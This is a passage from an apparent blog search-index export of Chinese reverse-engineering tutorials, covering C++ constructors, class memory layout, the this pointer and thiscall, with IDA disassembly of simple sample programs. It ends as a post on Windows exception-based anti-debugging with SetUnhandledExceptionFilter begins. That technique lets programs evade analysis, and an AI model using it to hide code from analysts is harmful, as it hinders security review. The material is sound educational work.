父类或本类中定义的成员对象带有构造函数\n在对象被定义时，因为对象本身为派生类，所以构造顺序是先构造父类再构造自身。当父类中带有构造函数时，将会调用父类构造函数，而这个调用过程需要在构造函数内完成，因此编译器添加了默认的构造函数来完成这个调用过程。成员对象带有构造函数的情况与此相同。\n在没有定义构造函数的情况下，当类中没有虚函数存在，父类和成员对象也没有定义构造函数时，提供默认的构造函数已没有任何意义，只会降低程序的执行效率，因此编译器没有对这种情况的类提供默认的构造函数。\n小结构造函数的必要条件\n函数的调用是这个对象在作用域内的第一次成员函数调用，分析this指针即可区分对象，是哪个对象的this指针就是哪个对象的成员函数。\n\n使用thiscall调用方式，使用ecx或者rcx传递this指针，返回值为this指针。\n\n\n","slug":"C++逆向——构造函数","date":"2023-02-08T11:47:12.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"ad77af543ae71f35c74ef1805fcae1ac","title":"类","content":"结构体和类在C++中，结构体和类都具有构造函数、析构函数和成员函数，两者只有一个区别：结构体的访问控制默认为public，而类的默认访问控制是private。对于C++中的结构体而言，public、private、protected的访问控制都是在编译期进行检查，当越权访问时，编译过程中会检查此类错误并给予提示。编译成功后，程序在执行过程中不会在访问控制方面做任何检查和限制。因此，在反汇编中，C++的结构体与类没有分别，两者的原理相同，只是类型名称不同。\n类与对象结构体和类都是抽象的，在真实世界中它们只可以表示某个群体，无法确定这个群体中的某个独立个体，而对象则是群体中独立存在的个体。如：\n人 → 类、结构，抽象的概念\n关羽 → 实例对象，实际存在的事物\n由于类是抽象概念，当两个类的特征相同时，它们之间就是相等的关系。而对象是实际存在的，即使它们之间包含的数据相同，也不能视为同一个对象。\n对象的内存布局下面的代码定义了自定义类型Person类以及该类的实例对象person。\n123456789101112131415161718192021#include &lt;stdio.h&gt;class Person &#123; //Person为抽象类名称，如同“人”这个名称public:Person() &#123;age = 18;height = 180;&#125;int getAge() &#123; //类成员函数，如人类的行为，吃、喝、睡等return age;&#125;int getHeight() &#123;return height;&#125;private:int age; //类数据成员，如人类的身高、体重等int height;&#125;;int main(int argc, char* argv[]) &#123;Person person; //类的实例对象return 0;&#125;\n\n下面我们来看看对象person在内存中的布局\n\n从上图可以看出对象person在内存中的地址为0x009EF790，该地址 处 定 义 了 对 象 person 的 各 个 数 据 成 员 ， 分 别 存 放 在 地 址0x009EF790与0x009EF794处。对象person中先定义的数据成员在低地址处，后定义的数据成员在高地址处，依次排列。对象的大小只包含数据成员，类成员函数属于执行代码，不属于类对象的数据。\n由图可知，凡是属于Person类型的变量，在内存中都会占据8字节的空间。这8字节由类中的两个数据成员组成，它们都是int类型，数据长度为4字节。\n为什么在类中不能定义自身的对象呢？\n这是因为类需要在申请内存的过程中计算出自身的大小，以用于实例化。如果在类中定义了自身的对象，在计算各数据成员的长度时，又会回到自身，这样就形成了递归定义，而这个递归并没有出口，是一个无限循环的递归定义，所以不能定义自身对象作为类成员。但是，自身类型的指针除外，因为任何类型的指针在32位下占用的内存大小始终为4字节，64位下占8个字节，等同于一个常量值，因此将其作为类的数据成员不会影响长度的计算。\n空类空类中没有任何数据成员，按照该公式计算得出的对象长度为0字节。类型长度为0，则此类的对象不占内存空间。而实际情况是，空类的长度为1字节。如果对象完全不占用内存空间，空类就无法取得实例对象的地址，this指针失效，因此不能被实例化。而类的定义是由成员数据和成员函数组成的，在没有成员数据的情况下，还可以有成员函数，因此仍然需要做实例化。分配1字节的空间用于类的实例化，这1字节的数据并没有被使用。\nthis指针this指针应属于指针类型。this指针在32位环境下占4字节空间，在64位环境下占8字节空间，保存的数据为地址信息。“this”可翻译为“这个”，因此经过字面分析可认为this指针中保存了所属对象的首地址。\n访问类对象的数据成员123456789101112131415#include &lt;stdio.h&gt;class Person &#123;public:void setAge(int age) &#123; //公有成员函数this-&gt;age = age;&#125;public:int age; //公有数据成员&#125;;int main(int argc, char* argv[]) &#123;Person person;person.setAge(5); //调用成员函数printf(&quot;Person : %d\\n&quot;, person.age); //获取数据成员return 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//main函数.text:004010A0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010A0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010A0.text:004010A0 var_8           = dword ptr -8.text:004010A0 var_4           = dword ptr -4.text:004010A0 argc            = dword ptr  8.text:004010A0 argv            = dword ptr  0Ch.text:004010A0 envp            = dword ptr  10h.text:004010A0.text:004010A0                 push    ebp.text:004010A1                 mov     ebp, esp.text:004010A3                 sub     esp, 8.text:004010A6                 mov     eax, ___security_cookie.text:004010AB                 xor     eax, ebp.text:004010AD                 mov     [ebp-4], eax.text:004010B0                 push    5               ; 压入参数5.text:004010B2                 lea     ecx, [ebp-8]    ; 传参，取出对象person的首地址存入ecx.text:004010B5                 call    sub_401080      ; 调用setAge成员函数.text:004010BA                 mov     eax, [ebp-8]    ; 取出对象首地址处4字节的数据age存入eax.text:004010BD                 push    eax             ; 将eax中保存的数据成员存入传参.text:004010BE                 push    offset aPersonD ; &quot;Person : %d\\n&quot;.text:004010C3                 call    sub_401040      ; 调用printf函数.text:004010C8                 add     esp, 8.text:004010CB                 xor     eax, eax.text:004010CD                 mov     ecx, [ebp+var_4].text:004010D0                 xor     ecx, ebp        ; StackCookie.text:004010D2                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004010D7                 mov     esp, ebp.text:004010D9                 pop     ebp.text:004010DA                 retn.text:004010DA _main           endp//setAge成员函数.text:00401080 sub_401080      proc near               ; CODE XREF: _main+15↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080 arg_0           = dword ptr  8.text:00401080.text:00401080                 push    ebp.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx             ; 申请局部变量空间.text:00401084                 mov     [ebp-4], ecx    ; ecx中保存了对象person的首地址.text:00401087                 mov     eax, [ebp-4]    ; eax=this.text:0040108A                 mov     ecx, [ebp+8]    ; ecx=参数age.text:0040108D                 mov     [eax], ecx      ; this-&gt;age = 参数age.text:0040108F                 mov     esp, ebp.text:00401091                 pop     ebp.text:00401092                 retn    4.text:00401092 sub_401080      endp_DWORD *__thiscall sub_401080(_DWORD *this, int a2)&#123;  _DWORD *result; // eax  result = this;  *this = a2;  return result;&#125;\n\n上面代码演示了对象调用成员的方法以及取出数据成员的过程。使用默认的调用约定时，在调用成员函数的过程中，编译器做了一个“小动作”：利用寄存器ecx保存了对象的首地址，并以寄存器传参的方式将其传递到成员函数中，这便是this指针的由来。由此可见，所有成员函数（非静态成员函数）都有一个隐藏参数，即自身类型的指针，这样的默认调用约定称为thiscall。在成员函数中访问数据成员也是通过this指针间接访问的，这便是在成员函数内可以直接使用数据成员的原因。在类中使用数据成员和成员函数时，编译器隐藏了如下操作。\n12345678910111213class Person &#123;public:void show() &#123;//隐藏传递了this指针，这里实际为this-&gt;getAge()printf(&quot;%d\\n&quot;, getAge());&#125;int getAge() &#123;//隐藏传递了this指针，这里实际为retrun this-&gt;agereturn age;&#125;public:int age;&#125;;\n\n在C++的环境下，识别this指针的关键点是在函数的调用过程中使用ecx作为第一个参数，在ecx中保存的数据为对象的首地址，但并非所有this指针的传递都是如此。\n成员函数SetAge的调用方式为thiscall。thiscall的栈平衡方式与__stdcall相同，都是被调用方负责平衡。但是，两者传递参数的过程却不一样，声明为thiscall的函数，第一个参数使用寄存器ecx传递，而非通过栈顶传递。而且thiscall并不属于关键字，它是C++中成员函数特有的调用方式，在C语言中是没有这种调用方式的。由于在C++环境下，thiscall不属于关键字，因此函数无法显式声明为thiscall调用方式，而类的成员函数默认为thiscall调用方式。所以，在分析过程中，如果看到某函数使用ecx传递参数，且ecx中保留了对象的this指针以及在函数实现代码内，存在this指针参与的寄存器相对间接访问方式，如[reg+8]，即可怀疑此函数为成员函数。因为64位程序本来就使用rcx传递参数，所以无此特征。\n使用thiscall调用方式的成员函数要点分析如下。\n12345678lea ecx, [mem] ; 取对象首地址并存入ecx，要注意观察内存call FUN_ADDRESS ; 调用成员函数; 在函数调用内，ecx 尚未重新赋值之前mov XXX, ecx ; 发现函数内使用ecx中的数据，说明函数调用前对ecx的赋值，实际上是在传递参数; 其后 ecx 中的内容会传递给其他寄存器mov [reg+i], XXX ; 发现了寄存器相对间接寻址方式，如果能排除数组访问，说明reg中保存的是结构体或者类对象的首地址\n\n符合以上特点，基本可判定这是调用类的成员函数。通过分析函数代码中访问ecx的方式，再结合内存窗口，以ecx中的值为地址观察其数据，可以进一步分析并还原对象中的各数据成员。\n静态数据成员当类中的数据成员被修饰为静态时，对象的长度计算又会发生变化。虽然静态数据成员是在类中被定义的，但它与局部静态变量类似，存放的位置和全局变量一致。只是编译器增加了作用域的检查，在作用域之外不可见。同类对象将共同享有静态数据成员的空间。\n当对象为全局对象时，其内存布局与局部对象相同，只是所在内存地址以及构造函数和析构函数的触发时机不同。全局对象所在的内存地址空间为全局数据区，而局部对象的内存地址空间在栈中。\n因为静态数据成员和静态变量原理相同（都是含有作用域的特殊全局变量），所以该静态数据成员的初值会被写入编译链接后的执行文件。当程序被加载时，操作系统将执行文件中的数据读到对应的内存单元里，静态数据成员已经存在，而这时类并没有实例对象。静态数据成员和对象之间的生命周期不同，并且静态数据成员也不属于某一对象，与对象之间是一对多的关系。静态数据成员仅仅和类相关，和对象无关，多个对象可以拥有同一个静态数据成员。\n因为静态数据成员有此特性，所以在计算类和对象的长度时，静态数据成员属于特殊的独立个体，不被计算在其中。\n12345678910111213#include &lt;stdio.h&gt;class Static &#123; //类CStatic的定义public:static int staticNum; //静态数据成员int num; //普通数据成员&#125;;int Static::staticNum = 0; //静态数据成员初始化int main() &#123;Static obj;int size = sizeof(obj); //计算对象长度printf(&quot;Static : %d\\n&quot;, size); //显示对象长度return 0;&#125;\n\n\n通过sizeof获得对象obj占用的内存长度为4。静态数据成员staticNum没有参与对象obj的长度计算。staticNum为静态数据成员，num为普通数据成员，两者所属的内存地址空间不同，这也是静态数据成员不参与长度计算的原因之一，两者对比如下。\n1234567printf(&quot;0x%08x\\n&quot;, &amp;obj.staticNum); //使用对象直接调用静态数据成员push 0A2A2D4h //静态成员所在地址为0x0A2A2D4//部分printf代码分析略printf(&quot;0x%08x\\n&quot;, &amp;obj.num); //获取普通数据成员地址//获取对象的首地址并存入ecx，得到数据成员num的地址lea eax,[ebp-0Ch]//部分printf代码分析略\n\n在以上代码分析中，静态数据成员所在的地址为0x0A2A2D4，而普通数据成员的地址在ebp-0Ch中，是一个栈空间地址。在使用的过程中，静态数据成员是常量地址，可通过立即数间接寻址的方式访问。普通数据成员只有在类对象产生后才出现，地址值无法确定，只能以寄存器相对间接寻址的方式进行访问。在成员函数中使用这两种数据成员时，因为静态数据成员属于全局变量，并且不属于任何对象，所以访问时无须this指针。而普通的数据成员属于对象所有，访问时需要使用this指针\n在成员函数中使用静态数据成员与普通数据成员123456789101112131415161718#include &lt;stdio.h&gt;class Person &#123;public:void show();static int count; //静态数据成员int age; //普通数据成员&#125;;int Person::count = 0;void Person::show() &#123;printf(&quot;age = %d , count = %d&quot;, age, count);&#125;int main(int argc, char* argv[]) &#123;Person person;person.age = 1;person.count = 2;person.show();return 0;&#125;\n\nida汇编及伪代码视图：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182//main函数.text:004010B0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010B0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010B0.text:004010B0 var_8           = dword ptr -8.text:004010B0 var_4           = dword ptr -4.text:004010B0 argc            = dword ptr  8.text:004010B0 argv            = dword ptr  0Ch.text:004010B0 envp            = dword ptr  10h.text:004010B0.text:004010B0                 push    ebp.text:004010B1                 mov     ebp, esp.text:004010B3                 sub     esp, 8.text:004010B6                 mov     eax, ___security_cookie.text:004010BB                 xor     eax, ebp.text:004010BD                 mov     [ebp-4], eax.text:004010C0                 mov     dword ptr [ebp-8], 1 ; person.age=1，普通数据成员赋值.text:004010C7                 mov     dword ptr unk_403378, 2 ; person.count=2，静态数据成员赋值.text:004010D1                 lea     ecx, [ebp-8]    ; 传递this指针.text:004010D4                 call    sub_401080      ; 调用show成员函数.text:004010D9                 xor     eax, eax.text:004010DB                 mov     ecx, [ebp-4].text:004010DE                 xor     ecx, ebp        ; StackCookie.text:004010E0                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004010E5                 mov     esp, ebp.text:004010E7                 pop     ebp.text:004010E8                 retn.text:004010E8 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+0h] [ebp-8h] BYREF  v4 = 1;  unk_403378 = 2;  ((void (__thiscall *)(int *))sub_401080)(&amp;v4);  return 0;&#125;//show成员函数.text:00401080 ; int __thiscall sub_401080(_DWORD *this).text:00401080 sub_401080      proc near               ; CODE XREF: _main+24↓p.text:00401080.text:00401080 var_4           = dword ptr -4.text:00401080.text:00401080                 push    ebp.text:00401081                 mov     ebp, esp.text:00401083                 push    ecx.text:00401084                 mov     [ebp-4], ecx    ; 获取this指针.text:00401087                 mov     eax, dword ptr unk_403378 ; 直接访问静态数据成员count.text:0040108C                 push    eax.text:0040108D                 mov     ecx, [ebp-4]    ; 获取this指针.text:00401090                 mov     edx, [ecx]      ; 通过this指针访问数据成员age.text:00401092                 push    edx             ; char.text:00401093                 push    offset Format   ; &quot;age = %d , count = %d&quot;.text:00401098                 call    sub_401040      ; 调用printf函数.text:0040109D                 add     esp, 0Ch.text:004010A0                 mov     esp, ebp.text:004010A2                 pop     ebp.text:004010A3                 retn.text:004010A3 sub_401080      endpint __thiscall sub_401080(_DWORD *this)&#123;  return sub_401040(&quot;age = %d , count = %d&quot;, *this);&#125;int sub_401040(char *Format, ...)&#123;  FILE *v1; // eax  va_list va; // [esp+14h] [ebp+Ch] BYREF  va_start(va, Format);  v1 = _acrt_iob_func(1u);  return sub_401010(v1, Format, 0, va);&#125;int __cdecl sub_401010(FILE *Stream, char *Format, _locale_t Locale, va_list ArgList)&#123;  unsigned __int64 *v4; // eax  v4 = (unsigned __int64 *)sub_401000();  return _stdio_common_vfprintf(*v4, Stream, Format, Locale, ArgList);&#125;\n\n静态数据成员在反汇编代码中很难被识别，这是因为其展示形态与全局变量相同，很难被还原成对应的高级代码。可参考其代码的功能，酌情处理。\n对象作为函数参数对象作为函数的参数时，其传递过程较为复杂，传递方式也比较独特。对象的传参过程与数组不同，数组变量的名称代表数组的首地址，而对象的变量名称却不能代表对象的首地址。传参时不会像数组那样以首地址作为参数传递，而是先将对象中的所有数据进行备份（复制），将备份的数据作为形参传递到调用函数中使用。\n对象作为函数的参数1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)#include &lt;stdio.h&gt;class Person &#123;public:\tint age;\tint height;&#125;;void show(Person person) &#123; //参数为类Person的对象\tprintf(&quot;age = %d , height = %d\\n&quot;, person.age,\t\tperson.height);&#125;int main(int argc, char* argv[]) &#123;\tPerson person;\tperson.age = 1;\tperson.height = 2;\tshow(person);\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//main函数.text:004010A0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010A0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010A0.text:004010A0 var_8           = dword ptr -8.text:004010A0 var_4           = dword ptr -4.text:004010A0 argc            = dword ptr  8.text:004010A0 argv            = dword ptr  0Ch.text:004010A0 envp            = dword ptr  10h.text:004010A0.text:004010A0                 push    ebp.text:004010A1                 mov     ebp, esp.text:004010A3                 sub     esp, 8.text:004010A6                 mov     dword ptr [ebp-8], 1 ; person.age=1，对象首地址为ebp-8.text:004010AD                 mov     dword ptr [ebp-4], 2 ; person.height=2.text:004010B4                 mov     eax, [ebp-4].text:004010B7                 push    eax             ; 传递参数2，person.height.text:004010B8                 mov     ecx, [ebp-8].text:004010BB                 push    ecx             ; 传递参数1，person.age.text:004010BC                 call    sub_401080      ; 调用show函数.text:004010C1                 add     esp, 8.text:004010C4                 xor     eax, eax.text:004010C6                 mov     esp, ebp.text:004010C8                 pop     ebp.text:004010C9                 retn.text:004010C9 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  sub_401080(1, 2);  return 0;&#125;//show函数.text:00401080 ; int __cdecl sub_401080(char).text:00401080 sub_401080      proc near               ; CODE XREF: _main+1C↓p.text:00401080.text:00401080 arg_0           = byte ptr  8.text:00401080 arg_4           = dword ptr  0Ch.text:00401080.text:00401080                 push    ebp.text:00401081                 mov     ebp, esp.text:00401083                 mov     eax, [ebp+0Ch]  ; person.height.text:00401086                 push    eax.text:00401087                 mov     ecx, [ebp+8]    ; person.age，对象首地址为ebp+8.text:0040108A                 push    ecx             ; char.text:0040108B                 push    offset Format   ; &quot;age = %d , height = %d\\n&quot;.text:00401090                 call    sub_401040      ; 调用printf函数.text:00401095                 add     esp, 0Ch.text:00401098                 pop     ebp.text:00401099                 retn.text:00401099 sub_401080      endpint __cdecl sub_401080(char a1)&#123;  return sub_401040(&quot;age = %d , height = %d\\n&quot;, a1);&#125;\n\n上面代码中的类Person的体积不大，只有两个数据成员，编译器在调用函数传参的过程中分别将对象的两个成员依次压栈，也就是直接将两个数据成员当成两个int类型数据，并将它们当作printf函数的参数。64位程序中直接使用一个寄存器存储类的两个数据成员。同理，它们也是一份复制数据，除数据相同外，与对象中的两个数据成员没有关系。\n类对象中数据成员的传参顺序为最先定义的数据成员最后压栈，最后定义的数据成员最先压栈。\n含有数组数据成员的对象传参12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tint age;\tint height;\tchar name[32]; //定义数组类型的数据成员&#125;;void show(Person person) &#123;\tprintf(&quot;age = %d , height = %d name:%s\\n&quot;, person.age,\t\tperson.height, person.name);&#125;int main(int argc, char* argv[]) &#123;\tPerson person;\tperson.age = 1;\tperson.height = 2;\tstrcpy(person.name, &quot;tom&quot;); //赋值数据成员数组\tshow(person);\treturn 0;&#125;\n\nida汇编及伪代码视图：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253.text:004010A0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010A0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010A0.text:004010A0 var_2C          = dword ptr -2Ch.text:004010A0 var_28          = dword ptr -28h.text:004010A0 var_24          = dword ptr -24h.text:004010A0 var_4           = dword ptr -4.text:004010A0 argc            = dword ptr  8.text:004010A0 argv            = dword ptr  0Ch.text:004010A0 envp            = dword ptr  10h.text:004010A0.text:004010A0                 push    ebp.text:004010A1                 mov     ebp, esp.text:004010A3                 sub     esp, 2Ch.text:004010A6                 mov     eax, ___security_cookie.text:004010AB                 xor     eax, ebp.text:004010AD                 mov     [ebp-4], eax.text:004010B0                 push    esi.text:004010B1                 push    edi.text:004010B2                 mov     dword ptr [ebp-2Ch], 1 ; person.age=1，对象首地址ebp-2Ch.text:004010B9                 mov     dword ptr [ebp-28h], 2 ; person.height=2.text:004010C0                 mov     eax, ds:dword_402120 ; &quot;tom&quot;.text:004010C5                 mov     [ebp-24h], eax  ; eax=person.name地址.text:004010C8                 sub     esp, 28h        ；调整栈顶.text:004010CB                 mov     ecx, 0Ah        ; 设置循环次数为10.text:004010D0                 lea     esi, [ebp-2Ch]  ; 获取对象的首地址并保存到esi.text:004010D3                 mov     edi, esp        ; 设置edi为当前栈顶.text:004010D5                 rep movsd               ; 执行10次4字节内存复制，将esi所指向的数据复制到edi中，类似memcpy的内联方式.text:004010D7                 call    sub_401080      ; 调用show函数.text:004010DC                 add     esp, 28h.text:004010DF                 xor     eax, eax.text:004010E1                 pop     edi.text:004010E2                 pop     esi.text:004010E3                 mov     ecx, [ebp-4].text:004010E6                 xor     ecx, ebp        ; StackCookie.text:004010E8                 call    @__security_check_cookie@4 ; __security_check_cookie(x).text:004010ED                 mov     esp, ebp.text:004010EF                 pop     ebp.text:004010F0                 retn.text:004010F0 _main           endpint __cdecl main(int argc, const char **argv, const char **envp)&#123;  _DWORD v4[10]; // [esp-28h] [ebp-5Ch] BYREF  int v5[10]; // [esp+8h] [ebp-2Ch] BYREF  v5[0] = 1;  v5[1] = 2;  v5[2] = &#x27;mot&#x27;;  qmemcpy(v4, v5, sizeof(v4));  sub_401080(v4[0], v4[1], v4[2]);  return 0;&#125;\n\n在传递类对象的过程中调整栈顶指针esp，（参数变量在传递时，需要向低地址调整栈顶指针esp）\n深拷贝数据在复制对象时，编译器会调用一次该类的复制构造函数，给编码者一次机会。深拷贝利用这次机会原对象的数据成员保存的资源信息制作一份副本。这样，当销毁复制对象时，销毁的资源是复制对象在复制构造函数中制作的副本，而非原对象中保存的资源信息。\n设置引用计数在进入复制构造函数时，记录类对象被复制引用的次数。当对象被销毁时，检查这个引用计数中保存的引用复制次数是否为0。如果是，则释放申请的资源，否则引用计数减1。当参数为对象的指针类型时，则不存在这种错误。传递的数据是指针类型，在函数内的操作都是针对原对象的，不存在对象被复制的问题。因为没有副本，所以在函数进入和退出时不会调用构造函数和析构函数，也就不存在资源释放的错误隐患。在使用类对象作为参数时，如无特殊需求，应尽量使用指针或引用。这样做不但可以避免资源释放的错误隐患，还可以在函数调用过程中避免复制对象的过程，提升程序运行的效率\n对象作为返回值对象作为返回值与对象作为参数的处理方式非常相似。对象作为参数时，进入函数前预先保留对象使用的栈空间并将实参对象中的数据复制到栈空间中。该栈空间作为函数参数，用于函数内部使用。同理，对象作为返回值时，进入函数后将申请返回对象使用的栈空间，在退出函数时，将返回对象中的数据复制到临时的栈空间中，以这个临时栈空间的首地址作为返回值。\n对象作为返回值123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt;#pragma warning(disable : 4996)class Person &#123;public:\tint count;\tint buffer[10]; //定义两个数据成员，该类的大小为44字节&#125;;Person getPerson() &#123;\tPerson person;\tperson.count = 10;\tfor (int i = 0; i &lt; 10; i++) &#123;\t\tperson.buffer[i] = i + 1;\t&#125;\treturn person;&#125;int main(int argc, char* argv[]) &#123;\tPerson person;\tperson = getPerson();\tprintf(&quot;%d %d %d&quot;, person.count, person.buffer[0],\t\tperson.buffer[9]);\treturn 0;&#125;\n\nida汇编及伪代码视图：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960.text:004010D0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010D0 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p.text:004010D0.text:004010D0 var_84          = byte ptr -84h.text:004010D0 var_58          = byte ptr -58h.text:004010D0 var_2C          = byte ptr -2Ch.text:004010D0 var_28          = dword ptr -28h.text:004010D0 argc            = dword ptr  8.text:004010D0 argv            = dword ptr  0Ch.text:004010D0 envp            = dword ptr  10h.text:004010D0.text:004010D0                 push    ebp.text:004010D1                 mov     ebp, esp.text:004010D3                 sub     esp, 84h        ; 预留返回对象的栈空间.text:004010D9                 push    esi.text:004010DA                 push    edi.text:004010DB                 lea     eax, [ebp-84h]  ; 获取返回对象的栈空间首地址.text:004010E1                 push    eax             ; 将返回对象的首地址压入栈中，用于保存返回对象的数据.text:004010E2                 call    sub_401080      ; 调用getPerson函数.text:004010E7                 add     esp, 4          ; 函数调用结束后，eax中保存着地址ebp-84h，即返回对象的首地址.text:004010EA                 mov     ecx, 0Bh        ; 设置循环次数.text:004010EF                 mov     esi, eax        ; 将返回对象的首地址存入esi中.text:004010F1                 lea     edi, [ebp-58h]  ; 获取临时对象的首地址.text:004010F4                 rep movsd               ; 每次从返回对象中复制4字节数据到临时对象的地址中，共复制11次.text:004010F6                 mov     ecx, 0Bh        ; 重新设置复制次数.text:004010FB                 lea     esi, [ebp-58h]  ; 获取临时对象的首地址.text:004010FE                 lea     edi, [ebp-2Ch]  ; 获取对象person的首地址.text:00401101                 rep movsd               ; 将数据复制到对象person中.text:00401103                 mov     ecx, 4.text:00401108                 imul    edx, ecx, 9.text:0040110B                 mov     eax, [ebp+edx-28h] ; eax=[ebp-2Ch+4+9*4].text:0040110F                 push    eax             ; 参数4，pperson.buffer[9].text:00401110                 mov     ecx, 4.text:00401115                 imul    edx, ecx, 0.text:00401118                 mov     eax, [ebp+edx-28h] ; eax=[ebp-2Ch+4+0*4].text:0040111C                 push    eax             ; 参数3，pperson.buffer[0].text:0040111D                 mov     ecx, [ebp-2Ch].text:00401120                 push    ecx             ; 参数2，person.count.text:00401121                 push    offset Format   ; &quot;%d %d %d&quot;.text:00401126                 call    sub_401040      ; 调用printf函数.text:0040112B                 add     esp, 10h.text:0040112E                 xor     eax, eax.text:00401130                 pop     edi.text:00401131                 pop     esi.text:00401132                 mov     esp, ebp.text:00401134                 pop     ebp.text:00401135                 retn.text:00401135 _main           endp\tint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[44]; // [esp+8h] [ebp-84h] BYREF  char v5[44]; // [esp+34h] [ebp-58h] BYREF  char v6[44]; // [esp+60h] [ebp-2Ch] BYREF  qmemcpy(v5, (const void *)sub_401080(v4), sizeof(v5));  qmemcpy(v6, v5, sizeof(v6));  sub_401040(&quot;%d %d %d&quot;, v6[0]);  return 0;&#125;\n\n上面代码演示了函数返回对象的全过程。在调用getPerson前，编译器将在main()函数中申请的返回对象的首地址作为参数压栈，在函数getPerson调用结束后进行数据复制，将getPerson函数中定义的局部对象person的数据复制到这个返回对象的空间中，再将这个返回的对象复制给目标对象person，从而达到返回对象的目的。\n因为在这个示例中不存在函数返回后为对象的引用赋值，所以这里的返回对象是临时存在的，也就是C++中的临时对象，作用域仅限于单条语句。\n为什么会产生这个临时对象呢？\n因为调用返回对象的函数时，C++程序员可能采用这类写法，如getPerson().count，这只是针对返回对象的操作，而此时函数已经退出，其栈帧也被关闭了。函数退出后去操作局部对象显然不合适，因此只能由函数的调用方准备空间，建立临时对象，然后将函数中的局部对象复制给临时对象，再把这个临时对象交给调用方去操作。本例中的person &#x3D; getPerson()；是个赋值运算，因为赋值时getPerson函数已经退出，所以栈空间也关闭了。同理，person不能直接和函数内局部对象做赋值运算，因此需要临时对象记录返回值之后再参与赋值。\n总结当对象结构简单、体积小时，函数间的对象传递直接使用eax和edx保存对象中的内容。当对象体积过大，结构复杂时，寄存器就明显不够用了，于是编译器在开发人员不知情的情况下，偷偷给函数加上一个参数，将其作为返回值。传递参数对象时，存在一次复制过程，简单的对象直接按成员顺序执行push指令传参，复杂的对象则使用重复前缀的串操作指令rep movs，其edi被设置为栈顶。在访问对象成员时，寻址方式颇为特别，使用的是寄存器相对间接访问方式。这种访问方式可以作为识别对象的必要条件，但是还须考察成员类型。如果类型一致，则应优先考虑是数组的访问。因为在数组的下标访问时，编译器也可能采用寄存器相对间接访问方式，如a[i]，当i为常量时就会出现寄存器相对间接访问方式。当对象在栈内时，其首地址表示为ebp±n或者esp + n，其中n为立即数，而编译器计算对象成员的地址为对象首地址+成员偏移量，这个偏移量值是编译器在编译过程中确定的，视为常量值，结合上式，对象成员的地址表达为ebp ± n + offset或者esp + n + offset，其中n和offset（成员偏移量）皆为常量，符合常量折叠的优化条件，于是在编译时可计算出N &#x3D; n±offset，所以在分析的时候，我们只能看到ebp±N或者esp + N。\n","slug":"C++逆向——类","date":"2023-02-07T05:38:12.000Z","categories_index":"","tags_index":"c++逆向","author_index":"0netry"},{"id":"744ee437e256eacc7e89be203fb836fd","title":"Windows动态反调试技术（一）","content":"异常SetUnhandledExceptionFilter()进程中发生异常时，若SEH未处理或注册的SEH根本不存在，此时会调用执行系统的kernel32!UnhandledExceptionFilter() API。该函数内部会运行系统的最后一个异常处理器（名为Top Level Exception Filter或Last Exception Filter）。系统最后的异常处理器通常会弹出错误消息框，然后终止进程。\n值得注意的是，kernel32!UnhandledExceptionFilter() 内部调用了ntdll!NtQueryInformationProcess(ProcessDebugPort) API（静态反调试技术），以判断是否正在调试进程。若进程正常运行（非调试运行），则运行系统最后的异常处理器；若进程处于调试中，则将异常派送给调试器。通过kernel32!SetUnhandledExceptionFilter() API可以修改系统最后的异常处理器（Top Level Exception Filter）。\nSetUnhandledExceptionFilter() API函数原型如下：\n123 LPTOP_LEVEL_EXCEPTION_FILTER WINAPI SetUnHandledExceptionFilter(__in LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);\n\n调用该函数修改系统最后异常处理器时，只要将新的Top Level Exception Filter函数地址传递给函数的IpTopLeveIExceptionFilter参数即可（返回值为上一个Last Exception Filter函数地址）。Top Level Exception Filter函数定义如下：\nTopLevelExceptionFilter() API12345678def struct _EXCEPTION_POINTERS&#123;  PEXCEPTION_RECORD ExceptionRecord;  PCONTEXT          ContextRecord;&#125;EXCEPTION_POINTERS,*PEXCEPTION_POINTERS;LONG TopLevelExceptionFilter(PEXCEPTION_POINTERS pExcept);\n\n基于异常的反调试技术中，通常先特意触发异常，然后在新注册的Last Exception 